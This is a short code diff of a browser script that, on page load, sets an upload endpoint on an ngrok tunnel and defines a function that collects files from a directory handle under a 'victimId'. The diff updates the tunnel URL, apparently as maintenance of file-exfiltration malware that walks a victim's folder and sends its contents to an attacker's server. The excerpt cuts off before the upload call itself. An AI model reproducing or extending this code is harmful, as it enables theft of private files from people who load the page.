@@ -1,7 +1,5 @@
 document.addEventListener('DOMContentLoaded', function () {
-  //const serverUrl = 'https://ngrok.com/r/iep/upload';
-  //const serverUrl = 'https://c0c1-113-40-207-10.ngrok-fr/upload'; // Update this line with the correct ngrok URL
-  const serverUrl = 'https://dc63-113-40-207-10.ngrok-fr/upload';
+  const serverUrl = 'https://defc-113-40-207-10.ngrok-free.app/upload';
 
   async function processDirectory(directoryHandle, victimId, currentPath = '') {
     const files = []; // Store all files
